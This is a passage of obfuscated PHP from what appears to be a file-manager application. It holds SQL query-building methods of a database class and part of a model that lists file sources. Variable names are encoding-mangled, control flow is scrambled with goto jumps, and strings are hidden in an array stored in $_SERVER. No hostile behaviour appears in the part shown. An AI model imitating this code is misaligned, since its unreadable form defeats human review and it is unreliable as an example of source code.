. $EÄ¨É¢ª°¸[1010] . $E’£¶¬•Ï . $EÄ¨É¢ª°¸[50]; } } $b„Ğ§”ğ¸… = substr($b„Ğ§”ğ¸…, 0, -4); } } else { $b„Ğ§”ğ¸… .= $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[1014] . $this->parseValue($dØ†Ö­¹¤Ç); } return $b„Ğ§”ğ¸…; } protected function parseThinkWhere($d¥¥ÔÉÕÓß, $fÁĞÀäÂñ–) { $e˜¡¢óØ¹Å =& $_SERVER[›é¼±]; $dóÂëš­Ü = $e˜¡¢óØ¹Å[33]; switch ($d¥¥ÔÉÕÓß) { case $e˜¡¢óØ¹Å[350]: $dóÂëš­Ü = $fÁĞÀäÂñ–; break; case $e˜¡¢óØ¹Å[997]: $dóÂëš­Ü = is_string($fÁĞÀäÂñ–) ? $fÁĞÀäÂñ– : substr($this->parseWhere($fÁĞÀäÂñ–), 6); break; case $e˜¡¢óØ¹Å[1015]: parse_str($fÁĞÀäÂñ–, $Eòšà¤»°á); if (isset($Eòšà¤»°á[$e˜¡¢óØ¹Å[992]])) { $díÔ¹Ù·Ü… = $e˜¡¢óØ¹Å[50] . strtoupper($Eòšà¤»°á[$e˜¡¢óØ¹Å[992]]) . $e˜¡¢óØ¹Å[50]; unset($Eòšà¤»°á[$e˜¡¢óØ¹Å[992]]); } else { $díÔ¹Ù·Ü… = $e˜¡¢óØ¹Å[996]; } $eÛìØõ³Òè = array(); foreach ($Eòšà¤»°á as $b¾²­Œø§Š => $CÁÁšï†‰Ú) { $eÛìØõ³Òè[] = $this->parseKey($b¾²­Œø§Š) . $e˜¡¢óØ¹Å[1014] . $this->parseValue($CÁÁšï†‰Ú); } $dóÂëš­Ü = implode($díÔ¹Ù·Ü…, $eÛìØõ³Òè); break; } return $dóÂëš­Ü; } protected function parseLimit($BÏµ»¿Ø·©) { $cøÚğ ò÷ğ =& $_SERVER[›é¼±]; return !empty($BÏµ»¿Ø·©) ? $cøÚğ ò÷ğ[48] . $BÏµ»¿Ø·© . $cøÚğ ò÷ğ[50] : $cøÚğ ò÷ğ[33]; } protected function parseJoin($dã’²Ï¦ˆ») { $a†„œÛÒóÑ =& $_SERVER[›é¼±]; $d•¶™òØâ = $a†„œÛÒóÑ[33]; if (!empty($dã’²Ï¦ˆ»)) { if (is_array($dã’²Ï¦ˆ»)) { foreach ($dã’²Ï¦ˆ» as $ašİÎŸÃ¢ï => $Eä®É¿·ê) { if (!1 !== stripos($Eä®É¿·ê, $a†„œÛÒóÑ[1016])) { $d•¶™òØâ .= $a†„œÛÒóÑ[50] . $Eä®É¿·ê; } else { $d•¶™òØâ .= $a†„œÛÒóÑ[1017] . $Eä®É¿·ê; } } } else { $d•¶™òØâ .= $a†„œÛÒóÑ[1017] . $dã’²Ï¦ˆ»; } } $d•¶™òØâ = preg_replace($a†„œÛÒóÑ[1018], think_config($a†„œÛÒóÑ[924]) . $a†„œÛÒóÑ[1019], $d•¶™òØâ); return $d•¶™òØâ; } protected function parseOrder($B†£º­È§) { $bÑ±Ê†â“İ =& $_SERVER[›é¼±]; if (is_array($B†£º­È§)) { $b÷¨—õÙ¾£ = array(); foreach ($B†£º­È§ as $b‘¨­Å™ƒô => $Bà ŞÁ½˜£) { if (is_numeric($b‘¨­Å™ƒô)) { $b÷¨—õÙ¾£[] = $this->parseKey($Bà ŞÁ½˜£); } else { $Bà ŞÁ½˜£ = in_array(strtoupper(trim($Bà ŞÁ½˜£)), array($bÑ±Ê†â“İ[1020], $bÑ±Ê†â“İ[1021])) ? $bÑ±Ê†â“İ[50] . $Bà ŞÁ½˜£ : $bÑ±Ê†â“İ[33]; if (preg_match($bÑ±Ê†â“İ[1022], $b‘¨­Å™ƒô)) { $b÷¨—õÙ¾£[] = $this->parseKey($b‘¨­Å™ƒô) . $Bà ŞÁ½˜£; } else { think_exception($bÑ±Ê†â“İ[1023] . $b‘¨­Å™ƒô); } } } $B†£º­È§ = implode($bÑ±Ê†â“İ[47], $b÷¨—õÙ¾£); } return !empty($B†£º­È§) ? $bÑ±Ê†â“İ[1024] . $B†£º­È§ : $bÑ±Ê†â“İ[33]; } protected function parseGroup($cåŸÛìç—Ü) { $DØÊ¢ÀÈ­á =& $_SERVER[›é¼±]; return !empty($cåŸÛìç—Ü) ? $DØÊ¢ÀÈ­á[1025] . $cåŸÛìç—Ü : $DØÊ¢ÀÈ­á[33]; } protected function parseHaving($DãõÁæí‡) { $A–Í¢’‰º =& $_SERVER[›é¼±]; return !empty($DãõÁæí‡) ? $A–Í¢’‰º[1026] . $DãõÁæí‡ : $A–Í¢’‰º[33]; } protected function parseComment($D£³˜ë¯„½) { $CØÍ„½Ş”Ó =& $_SERVER[›é¼±]; return !empty($D£³˜ë¯„½) ? $CØÍ„½Ş”Ó[1027] . $D£³˜ë¯„½ . $CØÍ„½Ş”Ó[1028] : $CØÍ„½Ş”Ó[33]; } protected function parseDistinct($B•³ŒòÌÍ) { $Dî®†ÕÃ®Ó =& $_SERVER[›é¼±]; return !empty($B•³ŒòÌÍ) ? $Dî®†ÕÃ®Ó[1029] : $Dî®†ÕÃ®Ó[33]; } protected function parseUnion($e×˜óà¹•Ó) { $Aßùº§µ© =& $_SERVER[›é¼±]; if (empty($e×˜óà¹•Ó)) { return $Aßùº§µ©[33]; } if (isset($e×˜óà¹•Ó[$Aßùº§µ©[346]])) { $Fªôã¤‡ÔÔ = $Aßùº§µ©[1030]; unset($e×˜óà¹•Ó[$Aßùº§µ©[346]]); } else { $Fªôã¤‡ÔÔ = $Aßùº§µ©[1031]; } foreach ($e×˜óà¹•Ó as $c¾Ú™“¼Ï) { $dîäï¾˜‰[] = $Fªôã¤‡ÔÔ . (is_array($c¾Ú™“¼Ï) ? $this->buildSelectSql($c¾Ú™“¼Ï) : $c¾Ú™“¼Ï); } return implode($Aßùº§µ©[50], $dîäï¾˜‰); } public function insert($bô×À³ßŞ, $B‰¦¡åÄµÀ = array(), $CÜ‚¦¨…æ = false) { goto aŸº±ƒˆÖ; aŸº±ƒˆÖ: $b»ô§Í ®ì =& $_SERVER[›é¼±]; $CØ¢İÄÅ = $C«Ï‚ôîù = array(); $this->model = $B‰¦¡åÄµÀ[$b»ô§Í ®ì[279]]; goto EÖ¼îÀ‹ùË; EÖ¼îÀ‹ùË: foreach ($bô×À³ßŞ as $E±Ú”×¢“‚ => $dÚä„ÖÊéå) { if (is_array($dÚä„ÖÊéå) && $b»ô§Í ®ì[295] == $dÚä„ÖÊéå[0]) { $C«Ï‚ôîù[] = $this->parseKey($E±Ú”×¢“‚); $CØ¢İÄÅ[] = $dÚä„ÖÊéå[1]; } elseif (is_scalar($dÚä„ÖÊéå) || is_null($dÚä„ÖÊéå)) { $C«Ï‚ôîù[] = $this->parseKey($E±Ú”×¢“‚); $CØ¢İÄÅ[] = $this->parseValue($dÚä„ÖÊéå); } } $bÀƒ»®Üöµ = ($CÜ‚¦¨…æ ? $b»ô§Í ®ì[902] : $b»ô§Í ®ì[903]) . $b»ô§Í ®ì[904] . $this->parseTable($B‰¦¡åÄµÀ[$b»ô§Í ®ì[277]]) . $b»ô§Í ®ì[898] . implode($b»ô§Í ®ì[47], $C«Ï‚ôîù) . $b»ô§Í ®ì[899] . implode($b»ô§Í ®ì[47], $CØ¢İÄÅ) . $b»ô§Í ®ì[900]; $bÀƒ»®Üöµ .= $this->parseLock(isset($B‰¦¡åÄµÀ[$b»ô§Í ®ì[849]]) ? $B‰¦¡åÄµÀ[$b»ô§Í ®ì[849]] : !1); goto Aô“¾»¡Š‰; Aô“¾»¡Š‰: $bÀƒ»®Üöµ .= $this->parseComment(!empty($B‰¦¡åÄµÀ[$b»ô§Í ®ì[352]]) ? $B‰¦¡åÄµÀ[$b»ô§Í ®ì[352]] : $b»ô§Í ®ì[33]); return $this->execute($bÀƒ»®Üöµ, $this->parseBind(!empty($B‰¦¡åÄµÀ[$b»ô§Í ®ì[283]]) ? $B‰¦¡åÄµÀ[$b»ô§Í ®ì[283]] : array())); goto EÌàØŒÀõ¿; EÌàØŒÀõ¿: } public function selectInsert($fÅ”ÉºÀ´Ï, $E§ëÄŠ›êØ, $b¾é³Úçø = array()) { goto eĞ÷¬¨ŒŒ¸; eĞ÷¬¨ŒŒ¸: $aö¨ƒÔÎ–µ =& $_SERVER[›é¼±]; $this->model = $b¾é³Úçø[$aö¨ƒÔÎ–µ[279]]; if (is_string($fÅ”ÉºÀ´Ï)) { $fÅ”ÉºÀ´Ï = explode($aö¨ƒÔÎ–µ[47], $fÅ”ÉºÀ´Ï); } goto bñŒ”éˆâÚ; D©†Â°êé: return $this->execute($c­‡ƒ¨„Ôö, $this->parseBind(!empty($b¾é³Úçø[$aö¨ƒÔÎ–µ[283]]) ? $b¾é³Úçø[$aö¨ƒÔÎ–µ[283]] : array())); goto FÓ’ÃÓÇÛÛ; bñŒ”éˆâÚ: array_walk($fÅ”ÉºÀ´Ï, array($this, $aö¨ƒÔÎ–µ[901])); $c­‡ƒ¨„Ôö = $aö¨ƒÔÎ–µ[1032] . $this->parseTable($E§ëÄŠ›êØ) . $aö¨ƒÔÎ–µ[898] . implode($aö¨ƒÔÎ–µ[47], $fÅ”ÉºÀ´Ï) . $aö¨ƒÔÎ–µ[1010]; $c­‡ƒ¨„Ôö .= $this->buildSelectSql($b¾é³Úçø); goto D©†Â°êé; FÓ’ÃÓÇÛÛ: } public function update($A§îö¥Ûš¤, $aŸñåİ«ŞÜ) { $Dáë×œ‹Æ½ =& $_SERVER[›é¼±]; $this->model = $aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[279]]; $dîÅ³êŠ‰ = $Dáë×œ‹Æ½[1033] . $this->parseTable($aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[277]]) . $this->parseSet($A§îö¥Ûš¤) . $this->parseWhere(!empty($aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[273]]) ? $aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[273]] : $Dáë×œ‹Æ½[33]) . $this->parseOrder(!empty($aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[363]]) ? $aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[363]] : $Dáë×œ‹Æ½[33]) . $this->parseLimit(!empty($aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[290]]) ? $aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[290]] : $Dáë×œ‹Æ½[33]) . $this->parseLock(isset($aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[849]]) ? $aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[849]] : !1) . $this->parseComment(!empty($aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[352]]) ? $aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[352]] : $Dáë×œ‹Æ½[33]); return $this->execute($dîÅ³êŠ‰, $this->parseBind(!empty($aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[283]]) ? $aŸñåİ«ŞÜ[$Dáë×œ‹Æ½[283]] : array())); } public function delete($c›ä‰ÙÇë = array()) { $bŠ¶Ü°©Ñï =& $_SERVER[›é¼±]; $this->model = $c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[279]]; $e·»ã¦·Ä = $bŠ¶Ü°©Ñï[1034] . $this->parseTable($c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[277]]) . $this->parseWhere(!empty($c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[273]]) ? $c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[273]] : $bŠ¶Ü°©Ñï[33]) . $this->parseOrder(!empty($c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[363]]) ? $c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[363]] : $bŠ¶Ü°©Ñï[33]) . $this->parseLimit(!empty($c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[290]]) ? $c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[290]] : $bŠ¶Ü°©Ñï[33]) . $this->parseLock(isset($c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[849]]) ? $c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[849]] : !1) . $this->parseComment(!empty($c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[352]]) ? $c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[352]] : $bŠ¶Ü°©Ñï[33]); return $this->execute($e·»ã¦·Ä, $this->parseBind(!empty($c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[283]]) ? $c›ä‰ÙÇë[$bŠ¶Ü°©Ñï[283]] : array())); } public function select($dÁ¨Ø†Ÿƒ = array()) { goto Báˆ…ö¤˜ö; EŸ¦ƒ”±: if ($CĞ³Àãß‡ && !1 !== $FÙ«ğ¶º£¨) { think_cache($Dñ¨â’Ñ‡¹, $FÙ«ğ¶º£¨, $CĞ³Àãß‡); } return $FÙ«ğ¶º£¨; goto F®¾ŸÉ¯ƒ†; Aßİ•¼ ˆ: $CĞ³Àãß‡ = isset($dÁ¨Ø†Ÿƒ[$E…ø­¡ªòù[347]]) ? $dÁ¨Ø†Ÿƒ[$E…ø­¡ªòù[347]] : !1; if ($CĞ³Àãß‡) { $Dñ¨â’Ñ‡¹ = is_string($CĞ³Àãß‡[$E…ø­¡ªòù[93]]) ? $CĞ³Àãß‡[$E…ø­¡ªòù[93]] : $E…ø­¡ªòù[1035] . md5($b²ãÚè’ğá); $fÀÃÎŠ®æ† = think_cache($Dñ¨â’Ñ‡¹, $E…ø­¡ªòù[33], $CĞ³Àãß‡); if (!1 !== $fÀÃÎŠ®æ†) { return $fÀÃÎŠ®æ†; } } $FÙ«ğ¶º£¨ = $this->query($b²ãÚè’ğá, $this->parseBind(!empty($dÁ¨Ø†Ÿƒ[$E…ø­¡ªòù[283]]) ? $dÁ¨Ø†Ÿƒ[$E…ø­¡ªòù[283]] : array())); goto EŸ¦ƒ”±; Báˆ…ö¤˜ö: $E…ø­¡ªòù =& $_SERVER[›é¼±]; $this->model = $dÁ¨Ø†Ÿƒ[$E…ø­¡ªòù[279]]; $b²ãÚè’ğá = $this->buildSelectSql($dÁ¨Ø†Ÿƒ); goto Aßİ•¼ ˆ; F®¾ŸÉ¯ƒ†: } public function buildSelectSql($FŒÄÆÚÙù½ = array()) { goto f®é«‚ê­Ï; F›¶¶Â‚„: return $FÉÂ³ò°—š; goto B×ô¬Õ¨‘•; f®é«‚ê­Ï: $B‡›·ÃÌ‘ =& $_SERVER[›é¼±]; if (isset($FŒÄÆÚÙù½[$B‡›·ÃÌ‘[351]])) { if (strpos($FŒÄÆÚÙù½[$B‡›·ÃÌ‘[351]], $B‡›·ÃÌ‘[47])) { list($cØİÛÀÓª£, $A¶²öÁ‹ÛÛ) = explode($B‡›·ÃÌ‘[47], $FŒÄÆÚÙù½[$B‡›·ÃÌ‘[351]]); } else { $cØİÛÀÓª£ = $FŒÄÆÚÙù½[$B‡›·ÃÌ‘[351]]; } $cØİÛÀÓª£ = $cØİÛÀÓª£ ? $cØİÛÀÓª£ : 1; $A¶²öÁ‹ÛÛ = isset($A¶²öÁ‹ÛÛ) ? $A¶²öÁ‹ÛÛ : (is_numeric($FŒÄÆÚÙù½[$B‡›·ÃÌ‘[290]]) ? $FŒÄÆÚÙù½[$B‡›·ÃÌ‘[290]] : 20); $c›·ù©ë»‚ = $A¶²öÁ‹ÛÛ * ((int) $cØİÛÀÓª£ - 1); $FŒÄÆÚÙù½[$B‡›·ÃÌ‘[290]] = $c›·ù©ë»‚ . $B‡›·ÃÌ‘[47] . $A¶²öÁ‹ÛÛ; } if (think_config($B‡›·ÃÌ‘[1036])) { $A‹Ã‘Ó¯ƒ™ = $B‡›·ÃÌ‘[1037] . md5(serialize($FŒÄÆÚÙù½)); $cëŒŠŒ£˜² = think_cache($A‹Ã‘Ó¯ƒ™); if ($cëŒŠŒ£˜²) { return $cëŒŠŒ£˜²; } } goto a«‰áíá½; a«‰áíá½: $FÉÂ³ò°—š = $this->parseSql($this->selectSql, $FŒÄÆÚÙù½); $FÉÂ³ò°—š .= $this->parseLock(isset($FŒÄÆÚÙù½[$B‡›·ÃÌ‘[849]]) ? $FŒÄÆÚÙù½[$B‡›·ÃÌ‘[849]] : !1); if (isset($A‹Ã‘Ó¯ƒ™)) { think_cache($A‹Ã‘Ó¯ƒ™, $FÉÂ³ò°—š); } goto F›¶¶Â‚„; B×ô¬Õ¨‘•: } public function parseSql($eØçç²®Â, $C¢³·§à÷É = array()) { $c—Ÿí¼¢¶ =& $_SERVER[›é¼±]; $eØçç²®Â = str_replace(array($c—Ÿí¼¢¶[1038], $c—Ÿí¼¢¶[1039], $c—Ÿí¼¢¶[1040], $c—Ÿí¼¢¶[1041], $c—Ÿí¼¢¶[1042], $c—Ÿí¼¢¶[1043], $c—Ÿí¼¢¶[1044], $c—Ÿí¼¢¶[1045], $c—Ÿí¼¢¶[1046], $c—Ÿí¼¢¶[1047], $c—Ÿí¼¢¶[1048]), array($this->parseTable("{$C¢³·§à÷É[$c—Ÿí¼¢¶[277]]}"), $this->parseDistinct(isset($C¢³·§à÷É[$c—Ÿí¼¢¶[1049]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[1049]] : !1), $this->parseField(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[271]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[271]] : $c—Ÿí¼¢¶[182]), $this->parseJoin(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[280]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[280]] : $c—Ÿí¼¢¶[33]), $this->parseWhere(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[273]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[273]] : $c—Ÿí¼¢¶[33]), $this->parseGroup(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[509]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[509]] : $c—Ÿí¼¢¶[33]), $this->parseHaving(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[1050]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[1050]] : $c—Ÿí¼¢¶[33]), $this->parseOrder(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[363]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[363]] : $c—Ÿí¼¢¶[33]), $this->parseLimit(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[290]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[290]] : $c—Ÿí¼¢¶[33]), $this->parseUnion(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[345]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[345]] : $c—Ÿí¼¢¶[33]), $this->parseComment(!empty($C¢³·§à÷É[$c—Ÿí¼¢¶[352]]) ? $C¢³·§à÷É[$c—Ÿí¼¢¶[352]] : $c—Ÿí¼¢¶[33])), $eØçç²®Â); return $eØçç²®Â; } public function getLastSql($Aï·…»…¬» = '') { return $Aï·…»…¬» ? $this->modelSql[$Aï·…»…¬»] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($câ‰Ô¾Ê) { return addslashes($câ‰Ô¾Ê); } public function setModel($aÆ×ã±ó) { $this->model = $aÆ×ã±ó; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto C¸ˆù•Õ¼ ; Cù‡İ¾”»¶: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\162\x63\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\x61\x6d\145" => "\x69\x6f\137\163\157\x75\x72\x63\x65\137\155\145\164\x61", "\x6d\x65\x74\141\x46\151\x65\x6c\x64" => "\163\x6f\x75\162\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\151\146\171\x54\x69\155\145", "\x74\151\x6d\x65", "\x69\x6e\163\x65\x72\x74", "\146\x75\x6e\x63\164\x69\x6f\156"), array("\x63\162\x65\x61\164\x65\124\x69\155\x65", "\164\x69\155\145", "\x69\x6e\163\145\162\x74", "\x66\x75\x6e\143\x74\x69\x6f\x6e"), array("\166\x69\x65\x77\124\x69\155\145", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\146\165\x6e\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($CÏÁ’òø÷©) { return $this->listSource(array($_SERVER[›é¼±][396] => $CÏÁ’òø÷©)); } public function typeName($c§Ì©˜Õµ¼) { static $eÑİĞ½İ÷¿ = array(self::TYPE_SYSTEM => "\163\171\163\164\x65\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $eÑİĞ½İ÷¿[$c§Ì©˜Õµ¼ . $_SERVER[›é¼±][33]]; } public function sourceListInfo($cÎ–íÒ˜², $cÚ™ÃÌßÃ = false) { goto C±«®ÁÁ‘ˆ; F¶«ÛİùÓ: return array_to_keyvalue($A±ø›­×…ø, $cÏÅ„½¶ßÄ[397]); goto a¢¬‘ÈƒÏ¡; e§ø½’êÊ: if (!$cÎ–íÒ˜²) { return array(); } $A±ø›­×…ø = $this->where(array($cÏÅ„½¶ßÄ[397] => array($cÏÅ„½¶ßÄ[7], $cÎ–íÒ˜²)))->select(); $this->_listDataApply($A±ø›­×…ø, $cÚ™ÃÌßÃ); goto F¶«ÛİùÓ; C±«®ÁÁ‘ˆ: $cÏÅ„½¶ßÄ =& $_SERVER[›é¼±]; $cÎ–íÒ˜² = $cÎ–íÒ˜² ? $cÎ–íÒ˜² : array(); $cÎ–íÒ˜² = array_filter(array_unique($cÎ–íÒ˜²)); goto e§ø½’êÊ; a¢¬‘ÈƒÏ¡: } public function pathInfoFilter(&$Cä»Û’¤Àí) { goto B³å‰³ÄË; FÈ•Ğç…‹ã: static $f›”éßèª = false; if (!$F‡ÓÉ¢‡™) { goto A°œ¿‹ô±; A°œ¿‹ô±: $EÕÍ‚ñğ– = $d„‚ŠòËÜÚ[398]; $EÕÍ‚ñğ– .= $d„‚ŠòËÜÚ[399]; $EÕÍ‚ñğ– .= $d„‚ŠòËÜÚ[400]; goto F‰¶Šœ‰ƒ­; FÃé¡±â„ƒ: $dƒß²óŠÉ = array(); foreach ($F‡ÓÉ¢‡™ as $a¥áßÓ÷Â) { if (in_array($a¥áßÓ÷Â, $Dïà¹½­Ç§)) { continue; } $dƒß²óŠÉ[] = $a¥áßÓ÷Â; } $f›”éßèª = explode($d„‚ŠòËÜÚ[47], $d„‚ŠòËÜÚ[402]); goto bÁƒ±‘›»Û; F‰¶Šœ‰ƒ­: $f¾ƒî¦˜äõ = $d„‚ŠòËÜÚ[401]; $Dïà¹½­Ç§ = explode($d„‚ŠòËÜÚ[47], $f¾ƒî¦˜äõ); $F‡ÓÉ¢‡™ = explode($d„‚ŠòËÜÚ[47], $EÕÍ‚ñğ–); goto FÃé¡±â„ƒ; bÁƒ±‘›»Û: } foreach ($f›”éßèª as $b÷ñøÈâ®©) { if (isset($Cä»Û’¤Àí[$b÷ñøÈâ®©])) { $Cä»Û’¤Àí[$b÷ñøÈâ®©] = intval($Cä»Û’¤Àí[$b÷ñøÈâ®©]); } } goto då±ë±ÎŸŠ; f†ˆ‡Âô: $Cä»Û’¤Àí = array_field_key($Cä»Û’¤Àí, $C•³´«ö­Ï); return $Cä»Û’¤Àí; goto C¥Ö—ì‡; B³å‰³ÄË: $d„‚ŠòËÜÚ =& $_SERVER[›é¼±]; static $F‡ÓÉ¢‡™ = false; static $dƒß²óŠÉ = false; goto FÈ•Ğç…‹ã; då±ë±ÎŸŠ: $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[76]] = $d„‚ŠòËÜÚ[403] . $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[397]] . $d„‚ŠòËÜÚ[404]; $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[29]] = $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[405]] == 1 ? $d„‚ŠòËÜÚ[77] : $d„‚ŠòËÜÚ[193]; $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[406]] = $this->typeName($Cä»Û’¤Àí[$d„‚ŠòËÜÚ[406]]); goto D™™ãÍÙĞù; D™™ãÍÙĞù: if ($Cä»Û’¤Àí[$d„‚ŠòËÜÚ[405]] != 1) { $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[168]] = $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[407]]; unset($Cä»Û’¤Àí[$d„‚ŠòËÜÚ[407]]); } $C•³´«ö­Ï = $F‡ÓÉ¢‡™; if (isset($Cä»Û’¤Àí[$d„‚ŠòËÜÚ[408]]) && $Cä»Û’¤Àí[$d„‚ŠòËÜÚ[408]][$d„‚ŠòËÜÚ[409]] == -1) { $C•³´«ö­Ï = $dƒß²óŠÉ; } goto f†ˆ‡Âô; C¥Ö—ì‡: } public function listUserFav() { goto FÎ¸••Ì’ğ; b…êæğÆ‰: foreach ($cğ¸‹ëİ® as &$F˜™ò’Ó¸ğ) { $F˜™ò’Ó¸ğ = array($FÁéÄÀ——[414] => $F˜™ò’Ó¸ğ[$FÁéÄÀ——[395]], $FÁéÄÀ——[415] => $F˜™ò’Ó¸ğ[$FÁéÄÀ——[28]], $FÁéÄÀ——[416] => $F˜™ò’Ó¸ğ[$FÁéÄÀ——[76]], $FÁéÄÀ——[417] => $F˜™ò’Ó¸ğ[$FÁéÄÀ——[29]], $FÁéÄÀ——[418] => $F˜™ò’Ó¸ğ[$FÁéÄÀ——[194]], $FÁéÄÀ——[419] => $F˜™ò’Ó¸ğ[$FÁéÄÀ——[84]]); if ($F˜™ò’Ó¸ğ[$FÁéÄÀ——[29]] == $FÁéÄÀ——[411] && $bœˆò®…Ë£[$F˜™ò’Ó¸ğ[$FÁéÄÀ——[76]]]) { $F˜™ò’Ó¸ğ[$FÁéÄÀ——[85]] = $bœˆò®…Ë£[$F˜™ò’Ó¸ğ[$FÁéÄÀ——[76]]]; } } unset($F˜™ò’Ó¸ğ); return $cğ¸‹ëİ®; goto c‘‡ãÎáùğ; D…ëŠ±çÏ: $e‘²†„’ƒ¦ = array_to_keyvalue($e‘²†„’ƒ¦, $FÁéÄÀ——[33], $FÁéÄÀ——[76]); if ($e‘²†„’ƒ¦) { $bœˆò®…Ë£ = $this->listSource(array($FÁéÄÀ——[412] => array($FÁéÄÀ——[413], $e‘²†„’ƒ¦))); } $bœˆò®…Ë£ = array_to_keyvalue($bœˆò®…Ë£[$FÁéÄÀ——[367]], $FÁéÄÀ——[397]); goto b…êæğÆ‰; FÎ¸••Ì’ğ: $FÁéÄÀ—— =& $_SERVER[›é¼±]; $cğ¸‹ëİ® = Model($FÁéÄÀ——[410])->listData(); $e‘²†„’ƒ¦ = array_filter_by_field($cğ¸‹ëİ®, $FÁéÄÀ——[29], $FÁéÄÀ——[411]); goto D…ëŠ±çÏ; c‘‡ãÎáùğ: } public function listUserTag($cÆ¿›ßÊğ) { goto BÙâ­šãÍ‰; E‹Ğó¥¬¯–: $D ¦öíĞ†Å = array(); foreach ($BÄ¨«Õ±Ï² as $D‚õ ĞÑì¬) { $B¤Âàå½¸á = $D‚õ ĞÑì¬[$f¾…ÊÕçíß[76]]; if (!$B¤Âàå½¸á) { continue; } if (!isset($D ¦öíĞ†Å[$B¤Âàå½¸á])) { $D ¦öíĞ†Å[$B¤Âàå½¸á] = array(); } $D ¦öíĞ†Å[$B¤Âàå½¸á][] = $D‚õ ĞÑì¬[$f¾…ÊÕçíß[421]]; } $A±“ĞİÃğ· = array(); goto AÌÍ†ÊÉÍÉ; C˜Èï«È®×: $bñ¿ĞˆÀÂÇ = array_to_keyvalue($BÀ½˜–ÁŒº[$f¾…ÊÕçíß[74]], $f¾…ÊÕçíß[33], $f¾…ÊÕçíß[397]); $DÊÔÕ•À“µ = array_merge($bñ¿ĞˆÀÂÇ, $EøíŒé×); foreach ($A±“ĞİÃğ· as $B¤Âàå½¸á) { if (!in_array($B¤Âàå½¸á, $DÊÔÕ•À“µ)) { $fÜ…¹ƒ›†Â[] = $B¤Âàå½¸á; } } goto B²óê­öˆŒ; AÌÍ†ÊÉÍÉ: foreach ($D ¦öíĞ†Å as $d„êœ‚Ü±ó => $DŒ©—¡‡) { $D¡¸§ĞØÛ¼ = !0; if (!$cÆ¿›ßÊğ) { $A±“ĞİÃğ·[] = $d„êœ‚Ü±ó; continue; } foreach ($cÆ¿›ßÊğ as $d£µˆ¬œç„) { if (!in_array($d£µˆ¬œç„, $DŒ©—¡‡)) { $D¡¸§ĞØÛ¼ = !1; break; } } if ($D¡¸§ĞØÛ¼) { $A±“ĞİÃğ·[] = $d„êœ‚Ü±ó; } } if (!$A±“ĞİÃğ·) { return array(); } $BÀ½˜–ÁŒº = $this->listSource(array($f¾…ÊÕçíß[412] => array($f¾…ÊÕçíß[413], $A±“ĞİÃğ·))); goto Cîïè—öÚ; B²óê­öˆŒ: if ($fÜ…¹ƒ›†Â) { Model($f¾…ÊÕçíß[422])->removeBySource($fÜ…¹ƒ›†Â); } return $BÀ½˜–ÁŒº; goto dÈõÜÕë; Cîïè—öÚ: if (!$BÀ½˜–ÁŒº || count($A±“ĞİÃğ·) == $BÀ½˜–ÁŒº[$f¾…ÊÕçíß[364]][$f¾…ÊÕçíß[365]]) { return $BÀ½˜–ÁŒº; } $fÜ…¹ƒ›†Â = array(); $EøíŒé× = array_to_keyvalue($BÀ½˜–ÁŒº[$f¾…ÊÕçíß[75]], $f¾…ÊÕçíß[33], $f¾…ÊÕçíß[397]); goto 